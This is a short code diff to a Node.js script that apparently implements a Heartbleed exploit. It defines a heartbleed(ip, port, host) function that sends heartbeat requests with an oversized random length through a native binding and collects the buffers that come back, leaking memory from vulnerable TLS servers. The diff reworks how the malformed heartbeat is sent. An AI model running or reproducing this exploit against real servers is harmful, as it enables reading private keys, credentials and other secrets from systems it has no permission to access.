@@ -1,4 +1,5 @@
 #!/usr/bin/env node
+var binding = require('bindings')('heartbleed');
 var fs = require('fs');
 var tls = require('tls');
 var dns = require('dns');
@@ -61,10 +62,13 @@ function heartbleed(ip, port, host) {
     function send() {
       acc = [];
       total = 0;
-      sent = (65534 * Math.random()) | 1;
-      s.fakeHeartbeat(sent);
+      sent = (Math.random() * 65535) | 1;
+      s.sslWrap.setHeartbeatLength(sent);
+      s.pair.ssl.isSessionReused();
     }
-    s.pair.ssl.onfakeheartbeat = function(buf) {
+    // NOTE: Will be picked up by isSessionReused
+    s.sslWrap = new binding.SSLWrap();
+    s.sslWrap.onheartbeat = function(buf) {
       acc.push(buf);
       total += buf.length;
 
